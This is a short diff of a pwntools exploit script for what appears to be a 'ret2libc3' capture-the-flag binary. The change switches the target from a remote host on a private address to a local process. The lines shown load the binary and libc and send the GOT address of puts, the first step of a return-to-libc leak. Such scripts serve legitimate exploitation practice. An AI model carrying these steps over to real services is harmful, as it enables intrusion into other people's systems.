@@ -1,7 +1,7 @@
 from pwn import *
 
-io = remote("192.168.3.102",10001)
-#io =process('./ret2libc3')
+#io = remote("192.168.3.102",10001)
+io =process('./ret2libc3')
 elf = ELF("./ret2libc3")
 libc = ELF("libc-2.23.so")
 io.sendlineafter(b" :",str(elf.got['puts']))
